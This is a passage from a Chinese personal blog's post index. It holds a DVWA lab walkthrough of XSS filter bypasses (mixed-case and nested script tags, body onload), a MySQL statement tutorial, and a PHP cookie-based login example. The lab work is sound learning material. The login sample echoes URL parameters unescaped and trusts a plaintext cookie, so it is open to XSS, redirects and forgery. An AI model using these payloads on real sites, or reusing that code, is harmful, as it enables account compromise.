未完待续————————","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"XSS理解+练习","slug":"web安全-XSS攻击（一)","date":"2019-04-23T23:22:21.000Z","updated":"2019-07-24T00:38:56.720Z","comments":true,"path":"2019/04/24/web安全-XSS攻击（一)/","link":"","permalink":"http://bealright.github.io/2019/04/24/web安全-XSS攻击（一)/","excerpt":"","text":"XSS攻击和SQL注入都是web安全中很常见的攻击方式，最近先学习XSS攻击，待到XSS学完后再去学习SQL注入，哇（感慨一番），这些知识真的太有趣了。 在开始之前，有必要了解一下概念 1、XSS跨站脚本攻击定义 跨站脚本攻击是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式。为了与层叠样式表的缩写CSS区分开，跨站脚本攻击通常简写为XSS。 2、XSS类型1)反射型XSS 反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。 2)存储型XSS 存储型XSS脚本攻击是指由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，进而导致跨站脚本代码的执行。 3)DOM Based XSS 基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。 3、XSS攻击 1.XSS盗取用户信息 2.XSS盗取Cookie 3.XSS钓鱼攻击 4.XSS蠕虫攻击 了解完这些概念之后，就来实战。 一、在DVWA漏洞靶场练习 一、反射型XSS进行DVWA环境中，选择安全等级，这里就按照从低到高的顺序进行。选择XSS(Reflected),查看一下源代码。观察代码可以发现，这里没有任何过滤。那就输入最常用的语句 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 输入完之后便会出现这个弹窗了Medium接下来，切换到中级( Medium)如果还输入刚才我们输入的语句会出现什么结果，试试看。没有出现弹窗，看一下源代码。发现前面的&lt;script&gt;没有了，那就看看源代码中有什么过滤方式把&lt;script&gt;给过滤掉了查看源代码这里代码中用到了str_replace() 函数。str_replace() 函数的作用：替换字符串中的一些字符（区分大小写）。所以这里是把&lt;script&gt;给替换掉了，但是这个函数其实有个漏洞，区分大小写。。。那我输入这样的语句（大小写语句）1&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里代码只过滤了 &lt;script&gt;，那就换其他弹窗语句，也可以绕过。（body语句）1&lt;body onload=alert(/hacker/)&gt; 还可以采用双写绕过1&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt; 可以看到str_replace() 函数把包裹在外层的 &lt;script&gt;给过滤掉了，但是里面的并不会过滤掉，这样形成的还是一个完整的可执行的语句。 接下来，尝试高级的(high)拿&lt;script&gt;alert(/hacker/)&lt;/script&gt;这句来试试过滤完了，只剩下了一个&gt;那就看看源代码是如何过滤的preg_replace 函数执行一个正则表达式的搜索和替换。这里就了解一下正则表达式： 正则表达式(regularexpression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。 那这里就可以理解为代码将&lt;script全给替换了，那如何绕过。。。那我换一个语句弹窗不就行了。。。这里可以用body标签来弹框。1&lt;body onload=alert(/hacker/)&gt; 这就出现弹窗了。 二、储存型XSS 储存型和反射型最大的区别便是持久型，下面就从low到high练习，就可以清除的明白这两种类型的区别了。 low先看源代码代码很长，但我们只看最后输入结果那部分代码，发现stripslashes() 函数，查一下，发现这个函数的用法：删除由 addslashes() 函数添加的反斜杠。所以没有如何过滤，直接最常用的语句就可以了 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 但是这里有字数限制，没有办法输入了那就打开F12改一下改为之后输入成功，下面看看有啥区别，先跳转到其他页面去，再打开这个页面，会发现。。。又给我们弹出了这个页面，这就是储存型XSS。每当你登陆这个界面，就会弹出这个弹框。 Medium接下来，看一下中级的。还是先输入一下常见的语句可以看到&lt;script&gt;被过滤掉了。看一下源代码和反射型XSS的Medium一样，所以可以用这两个语句绕过123&lt;body onload=alert(/hacker/)&gt;&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt;&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里我们把三种语句都注入，再次点击这个页面会出现三次弹窗 high正则表达式，用之前的语句就可以直接绕过。 通过这些练习，可以了解就反射型的XSS攻击时间短，例如弹窗只弹出一次，而存储型的XSS攻击则直接储存在数据库中，只要用户访问就可以弹出。 将安全等级调至impossible安全等级调至到impossible，即不可绕过。就以反射型的XSS来说吧先以最常用的语句来攻击结果：发现&lt;和&gt;都被转换了，我们就去看一下源代码发现了这样的一个函数PHP htmlspecialchars() 函数，htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &apos; （单引号）成为 &apos; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt; 所以这个函数就把我们输入的&lt;和&gt;给过滤掉了，所以这是一种防护手段，防止恶意的XSS攻击。 下面看一下存储型XSS的impossible还是先用常用的攻击一下显示结果：这就不需要再看后台源码了，这直接就显示&lt;和&gt;已经被过滤了.我们就看一下源代码发现在输出那有一个htmlspecialchars() 函数，所以这个原理就和反射型XSS攻击一样。这样DVWA练习就结束了。 感悟：果然只有动手去操作了，才会了解一些概念和一些攻击方式，有很多很好的平台供自己去学习，合天、安全龙、漏洞银行等等，只要自己想要去学，这些东西都可以学到，接下来就去XSS通关平台和谨灵实验室继续练习。 努力吧，少年！！！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"PHP数据库概念、DDL语句、DML语句","slug":"PHP学习总结（数据库概念、DDL语句、DML语句）","date":"2019-04-22T01:38:24.000Z","updated":"2019-06-09T12:00:12.387Z","comments":true,"path":"2019/04/22/PHP学习总结（数据库概念、DDL语句、DML语句）/","link":"","permalink":"http://bealright.github.io/2019/04/22/PHP学习总结（数据库概念、DDL语句、DML语句）/","excerpt":"","text":"自从做完一个简单的登陆注册页面，发现数据库知识真的很重要，所以要详细的学习一下数据库的知识。 一、数据库基本概念数据库可以理解为用来存储信息的仓库 表:表是数据的矩阵，在一个数据库中的表看起来像一个简单的电子表格。列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。主键：主键是唯一的。一个数据表中只能包含一个主键,可以使用主键来查询据。表头(header): 每一列的名称;基本概念可以在菜鸟教程中学习菜鸟教程 二、DDL语句对数据库的操作 1).创建数据库1create database 数据库名; 例如:12mysql&gt; use bss;/使用这个名为bss的数据库Database changed 2)选择要操作的数据库1use 数据库名; 3)查看数据库中所有的数据表1show tables; 4)删除数据库1drop database 数据库名称; 例如：12345678910111213141516171819mysql&gt; create database xiao;Query OK, 1 row affected (0.00 sec)/这样就新建一个数据库，我们也可以在查看一下。mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bss || myhtml || mysql || performance_schema || score || test || xiao |+--------------------+8 rows in set (0.00 sec)/这样数据库中便有了这个xiao数据库，接下来再删除它。mysql&gt; drop database xiao;Query OK, 0 rows affected (1.85 sec)/这样xiao数据库就被删除了。 对表的操作 1）创建表1234create table 表名( 字段1名 字段1类型 列的约束条件(可加可不加), 字段2名 字段2类型 列的约束条件, ); 例如：12create table Q(id1 int,id2 int);/这样就创建好一个名为Q的表 2）查看表1234show tables;//查看表数据desc 表名;//查看表结构 例如：12345678910111213141516171819mysql&gt; desc user;/查看表结构+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || pass | varchar(30) | YES | | NULL | || name | varchar(30) | YES | | NULL | || ttt | varchar(40) | YES | | NULL | || sss | varchar(20) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+5 rows in set (0.01 sec)mysql&gt; show tables;/查看表数据+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec) 3）查看创建表的SQL语句123show create table 表名 \\Gshow create table 表名；//第一种相较于第二种更直观一些 例如：12345678910111213mysql&gt; show create table user;//查看建表命令+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| user | CREATE TABLE `user` ( `id` int(11) DEFAULT NULL, `pass` varchar(30) DEFAULT NULL, `name` varchar(30) DEFAULT NULL, `ttt` varchar(40) DEFAULT NULL, `sss` varchar(20) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8 |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 4)删除表1drop table 表名; 例如：12345678910111213141516171819202122mysql&gt; create table hello(id int,you varchar(30),me varchar(30));Query OK, 0 rows affected (1.78 sec)/接下来我们查看一下mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| hello || user || zzh |+---------------+3 rows in set (0.00 sec)/这样bbs数据库中便有这个hello的数据表了mysql&gt; drop table hello;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/这样就删除了刚才所创建的数据表 5)修改表的字段类型1alter table 表名 modify 字段名 字段类型; 例如：1alter table Q modify id1 varchar; 6)增加表字段1alter table 表名 add 字段名 字段类型; 例如：1alter table Q add id3 int; 7)删除表字段1alter table 表名 drop 字段名; 例如：1234567891011121314mysql&gt; alter table user drop pass;Query OK, 3 rows affected (1.81 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; desc user;/再次查询+----------+--------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+--------------+------+-----+---------+----------------+| Id | int(11) | NO | PRI | NULL | auto_increment || username | varchar(255) | YES | | NULL | || password | varchar(255) | YES | | NULL | |+----------+--------------+------+-----+---------+----------------+3 rows in set (0.01 sec)/这样的话就将新建的pass字段给删除了 8)字段改名1alter table 表名 change 旧字段名 新字段名 字段类型; 例如：123456789101112131415161718192021222324mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || he | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/这里我们想把字段he改为youmysql&gt; alter table zzh change he you varchar(20);Query OK, 0 rows affected (0.37 sec)Records: 0 Duplicates: 0 Warnings: 0/再次进行查询mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || you | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/可以看到he已经改为了you 9)修改字段排列排序例如： 12alter table Q modify id2 tinyint first;alter table Q modify id2 tinyint after id1; 10)更改表名1alter table 表名 rename 新的表名; 例如：12345678910111213141516171819202122mysql&gt; use bss;Database changedmysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/接下来我们把数据表user的名字改为usernamemysql&gt; alter table user rename username;Query OK, 0 rows affected (1.75 sec)/这些便实现了改表名称mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| username || zzh |+---------------+2 rows in set (0.00 sec) DML语句这里我使用test数据库中的welcome表来进行练习 1)查询语句1select * from 表名; 2)插入记录1insert into 表名(字段1,字段2,字段3,...,字段n) values(值1,值2,值3,...,值n); 注意：values后面的顺序应该和字段的排序一致例如：123456789101112131415mysql&gt; insert into welcome(username,password) values('WMM',123); Query OK, 1 row affected (0.00 sec)/注意values中有字符的话，用单引号括起来。mysql&gt; insert into welcome(username,password) values(2,123); Query OK, 1 row affected (0.31 sec)/这里插入两条数据mysql&gt; select * from welcome;/查询语句 +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | +----------+----------+ 3 rows in set (0.00 sec) 3)一次插入多条记录12345insert into 表名(字段1,字段2,字段3,...,字段n) values (值1,值2,值3,...,值n), (值1,值2,值3,...,值n), (值1,值2,值3,...,值n); 例如：1234567891011121314151617181920mysql&gt; insert into welcome(username,password) values -&gt; (1,123), -&gt; (2,123), -&gt; (3,123), -&gt; (4,123); Query OK, 4 rows affected (0.00 sec) Records: 4 Duplicates: 0 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) 4)更新记录1.更新一个表 1update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件]; 例如：1234567891011121314151617mysql&gt; update welcome set password=1234 where username='QTFY'; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 1234 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /可以看到QTFY的密码已经从123改为1234 2.更新多个表中数据1update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件]; 例如：123456789101112131415161718192021222324252627282930/首先再创建一个表Qmysql&gt; create table Q(id int,age int);Query OK, 0 rows affected (0.08 sec)mysql&gt; desc Q;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || age | int(11) | YES | | NULL | |+-------+---------+------+-----+---------+-------+2 rows in set (0.02 sec)mysql&gt; insert into Q(id,age) values(1,20);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from Q;+------+------+| id | age |+------+------+| 1 | 20 |+------+------+1 row in set (0.00 sec)/更新语句mysql&gt; update welcome,Q set welcome.password=2000,Q.age=2000 where welcome.username='QTFY' and Q.age=20;Query OK, 2 rows affected (0.00 sec)Rows matched: 2 Changed: 2 Warnings: 0/更新结果：| QTFY | 20001 | 2000 | 5)删除记录1.删除单表中的数据 1delete from 表名 [where 条件]; 例如：1234567891011121314151617181920212223242526272829mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /这里删除WMM记录 mysql&gt; delete from welcome where username='WMM'; Query OK, 1 row affected (0.00 sec) /删除成功了 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 6 rows in set (0.00 sec) 2.删除多个表中的数据、delete 表1,表2,…表n from 表1,表2,…表n [where 条件];不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。这里的操作和更新多表大致一样。 6)查询记录12select * from 表名;// 查询所有纪录 12select 字段名 from 表名； //查询某个字段的记录 例如：123456789101112131415161718192021mysql&gt; desc welcome; +----------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+-------+ | username | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | +----------+--------------+------+-----+---------+-------+ 2 rows in set (1.75 sec) /这里查username字段的记录 mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) 7)查询不重复的记录123 select distinct field1,field2 from 表名;//只要field1,field2任何一个字段有不同就会被选择！//一般使用distinct,只筛选一个字段! 例如：123456789101112131415161718192021222324mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) /采用查询不重复记录语句 mysql&gt; select distinct username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 3 | | 4 | +----------+ 5 rows in set (1.63 sec) 8)条件查询123= &lt; &gt; &gt;= &lt;= != 比较运算符//多个条件之间可以使用or and等//select * from 表名 where 条件 例如：12345678910111213141516171819202122232425262728293031323334353637mysql&gt; select * from welcome where username=4; +----------+----------+ | username | password | +----------+----------+ | 4 | 123 | +----------+----------+ 1 row in set, 1 warning (0.00 sec) / or的用法 mysql&gt; select * from welcome where username=4 or username=3; +----------+----------+ | username | password | +----------+----------+ | 3 | 123 | | 4 | 123 | +----------+----------+ 2 rows in set, 2 warnings (0.00 sec) /and的用法 mysql&gt; select * from welcome where username&gt;1 and username&lt;4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 2 | 123 | | 3 | 123 | +----------+----------+ 3 rows in set, 1 warning (0.00 sec) mysql&gt; select * from welcome where username&gt;=1 and username&lt;=4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 5 rows in set, 1 warning (0.00 sec) 9)排序和限制1234567排序: asc:由低到高 select * from 表名 order by 字段名 asc; desc:由高到底 select * from 表名 order by 字段名 desc; 多个字段排序 select * from 表名 order by 字段名 desc,字段名 desc; 例如：123456789101112131415161718192021222324252627282930313233343536373839/asc:由低到高mysql&gt; select * from welcome order by username asc;+----------+----------+| username | password |+----------+----------+| 1 | 123 || 2 | 123 || 2 | 123 || 3 | 123 || 4 | 123 || QTFY | 2000 |+----------+----------+6 rows in set (1.69 sec)/desc:由高到底mysql&gt; select * from welcome order by username desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec)/多个字段排序mysql&gt; select * from welcome order by username desc,password desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec) 限制:12在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。limit 数字1,数字2 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条！ 例如：123456789/从0条开始取一条mysql&gt; select * from welcome order by username desc limit 0,1 -&gt; ;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 |+----------+----------+1 row in set (0.00 sec) 10)聚合sum求和 1select sum(字段名) from 表名; 例如;1234567mysql&gt; select sum(password) from welcome; +---------------+ | sum(password) | +---------------+ | 2615 | +---------------+ 1 row in set (1.66 sec) count记录总数1select count(*|字段名) from 表名; 例如：1234567mysql&gt; select count(*) from welcome; +----------+ | count(*) | +----------+ | 6 | +----------+ 1 row in set (1.56 sec) max最大值1select max(字段名) from 表名; 例如：1234567mysql&gt; select max(password) from welcome; +---------------+ | max(password) | +---------------+ | 2000 | +---------------+ 1 row in set (0.00 sec) min最小值1select min(字段名) from 表名; GROUP BY分类聚合1select department,sum(字段名) from 表名 group by 字段名; WITH ROLLUP分类聚合后的结果进行再汇总1select sum(字段名) from 表名 group by 字段名 with rollup; HAVING 12注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！select sum(字段名) from 表名 group by 字段名 having sum(字段名)&gt;1000; 11)表连接显示多个表中的字段的时候即可使用表连接内连接：选取两张表中相互匹配的记录例如： 12345678910111213141516171819202122232425//这样的语句可以把两张表中互相匹配的记录放在一起 mysql&gt; select * from welcome,Q where welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | | 5 | 2 | 5 | 2 | | 6 | 1 | 6 | 1 | +----------+----------+------+------+ 6 rows in set (1.65 sec) mysql&gt; select welcome.username,Q.id from welcome,Q where welcome.username=Q.id; +----------+------+ | username | id | +----------+------+ | 1 | 1 | | 2 | 2 | | 3 | 3 | | 4 | 4 | | 5 | 5 | | 6 | 6 | +----------+------+ 6 rows in set (0.00 sec) 1内连接：select 表.字段名,.... from 表1名,表2名,... where 表1.字段=表2.字段; 外连接： 仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录左连接 概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)例如：12345678910111213mysql&gt; select * from welcome left join Q on welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +----------+----------+------+------+ 6 rows in set (0.00 sec) /查出左边表的所有记录，不管右边有没有相匹配的 右连接 概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录) 左连接和右连接是可以相互转换的！例如：123456789101112mysql&gt; select * from Q right join welcome on welcome.username=Q.id; +------+------+----------+----------+ | id | age | username | password | +------+------+----------+----------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +------+------+----------+----------+ 6 rows in set (0.00 sec) 12)子查询一个查询需要另外一个查询的结果参与的时候 用于子查询的关键字: in 语法：select from 表名 where id in(select 字段名 from 表名); in 在..里面 注意点 in后面的子语句必须只返回一个字段 若查询结果唯一(只有一条)可以使用=代替in not in 与in相反 exists 语法：select语句 where exists(select 语句); exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false 并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true. not exits 与exists相反 1)select from 表名 where deptno in(select deptno from 表名); 2)若查询结果唯一可以使用=代替in select * from 表名 where deptno=(select deptno from 表名 limit 限制条件); 13)记录联合​ 需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合 多个select 语句用 UNION或者UNION ALL隔开即可实现 区别： 前者 会将多个查询结果合并后并且进行去除重复后返回 后者 则直接合并并不去除重复 联合的条件：查询的列个数要相等例如： 1234567891011121314151617181920212223242526272829303132//第一种去除了重复的 mysql&gt; select * from welcome union select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | +----------+----------+ 6 rows in set (0.00 sec) //第二种没有去掉重复的 mysql&gt; select * from welcome union all select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 1 | 6 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 5 | 2 | | 6 | 1 | +----------+----------+ 12 rows in set (0.00 sec) mySQL中的DDL语句和DML语句都是常用的语句，总结下来，多回顾回顾。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"PHP会话控制","slug":"PHP学习总结(会话控制)","date":"2019-04-20T08:38:24.000Z","updated":"2019-06-09T12:00:16.514Z","comments":true,"path":"2019/04/20/PHP学习总结(会话控制)/","link":"","permalink":"http://bealright.github.io/2019/04/20/PHP学习总结(会话控制)/","excerpt":"","text":"最近刚做完一个简易的登陆注册小项目，当时做的时候匆忙，现在来详细的了解一下PHP会话控制这方面的知识。 cookie和seesion技术出现的原因： 当一个用户请求一个页面时，再请求同一个网站上的另外一个页面时，HTTP协议不能告诉我们两个请求是否来自同一个用户，也不能将两次访问联系到一起！所有出现了cookie和seesion. 一、cookiecookie是用来将网站的资料记录在客户端的技术，让web服务器将一些资料存放在客户端（用户的电脑中）。 1、向客户端电脑中设置cookie1setcookie(); 2、在服务器端上读取cookie内容1$_COOKIE 3、将多维数组应用于cookie中例如：12setcookie(\"member[name]\",'www',time()+3600);setcookie(\"member[email]\",'1111',time()+3600); 4、删除cookie例如：12345678setcookie(\"member[name]\",'',time()-3600);setcookie(\"member[email]\",'',time()-3600);//也可以采用遍历的方法foreach ($_COOKIE['member'] as $key=&gt;$val)&#123; var_dump(setcookie(\"member[&#123;$key&#125;]\",'',time()-3600)); &#125;//注意点： 使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致！ 二、sessionsession与cookie最大的不同就是,session是把具体信息保存在服务器端。 1、开启session例如：12345session_start();$_SESSION['name']='www';$_SESSION['email']='sss';$_SESSION['url']='zzz';/再另一个PHP文件中访问的时候必须加上 2、打开已存在的seesion12session_start();var_dump($_SESSION);/注意打开之前一定要先开启seesion 3、注销变量与销毁session先开启session123456789session_start(); session_unset();/释放所有变量 session_destroy();/销毁一个会话中的所有数据 setcookie('')/名字可以在设置session时，使用var_dump($_COOKIE)来获取cookie的名字 /也可以使用这样的方法 setcookie(session_name(),'',time()-3600);//销毁保存在客户端的cookie /但这样的方法删除的不干净 /可以采用这样的方法删除干净 setcookie(session_name(),'',time()+3600,'/');'/'表示设置cookie的根目录 三、基于session和cookie的登陆模块简易的用cookie来判断登陆login.php(登陆文件) 1234567891011121314151617181920212223242526272829303132333435&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; exit('您已经登录请不要重复登录'); &#125; if(isset($_POST['submit']))&#123; if(isset($_POST['username'])&amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']==='QTFY' &amp;&amp; $_POST['password']==='123')&#123; if(setcookie('username',$_POST['username'],time()+3600))&#123; header('Location:login.php'); &#125; else&#123; echo 'cookie设置失败！'; &#125; &#125; else &#123; header('Location:skip.php?url=login.php&amp;info=用户名或密码输入错误'); //应用跳转页面 &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;请登录&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=\"post\" action=\"login.php\"&gt; 姓名：&lt;input type=\"text\" name=\"username\" /&gt; 密码：&lt;input type=\"password\" name=\"password\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"登录\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; index.php(判断是否有cookie以此来进行识别用户身份)1234567&lt;?php header('Content-type:text/html;charset=utf-8'); if(isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY')&#123; echo \"&#123;$_COOKIE['username']&#125;你好，欢迎回来!\"; &#125;else&#123; echo \"&lt;a href='login.php'&gt;请重新登陆&lt;/a&gt;\"; ?&gt; 这样就可以做一个简易的登陆页面（带判断）skip.php(简单的跳转页面)12345678910111213141516171819&lt;?php header('Content-type:text/html;charset=utf-8'); if(!isset($_GET['url'])|| !isset($_GET['info']))&#123; exit(); &#125; &#125; ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;meta http-equiv=\"refresh\" content=\"3;URL=&lt;?php echo $_GET['url']?&gt;\"/&gt;//3秒 &lt;title&gt;正在跳转&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div style=\"text-align:center;font-size:20px;\"&gt;&lt;?php echo $_GET['info'] ?&gt;,三秒后自动跳转&lt;/div&gt; /info提示信息 &lt;/body&gt; &lt;/html&gt; loginout(注销功能页面)12345678910&lt;?php header('Content-type:text/html;charset=utf-8'); if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='QTFY') &#123; if(setcookie('username',$_POST['username'],time()-3600))&#123; header('Location:skip.php?url=index.php&amp;info=注销成功，正在跳转中！'); &#125;else&#123; header('Location:skip.php?url=index.php&amp;info=注销失败，请稍后重试！'); &#125; &#125;?&gt; 这样基于cookie的登陆页面就基本实现了session与cookie基本相同要注意：用session时，首先开启session。 这里就不演示了，具体的看之前做的登陆注册页面。这里又学到了一个跳转页面，之前都不知道如何用。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"PHP概念、基本语法、流程控制","slug":"PHP学习(php概念、基本语法、流程控制)","date":"2019-04-18T02:38:24.000Z","updated":"2019-06-09T12:00:23.547Z","comments":true,"path":"2019/04/18/PHP学习(php概念、基本语法、流程控制)/","link":"","permalink":"http://bealright.github.io/2019/04/18/PHP学习(php概念、基本语法、流程控制)/","excerpt":"","text":"一、初识PHP1.PHP开始标记 1&lt;?php 2.PHP结束标记1?&gt; 3.页面最终是通过HTML，CSS，JS来进行展示的 **4.PHP代码可以嵌入html代码中，可以嵌入到任意位置，并且可以嵌入多个php代码，必须在php文件中嵌入才生效。** 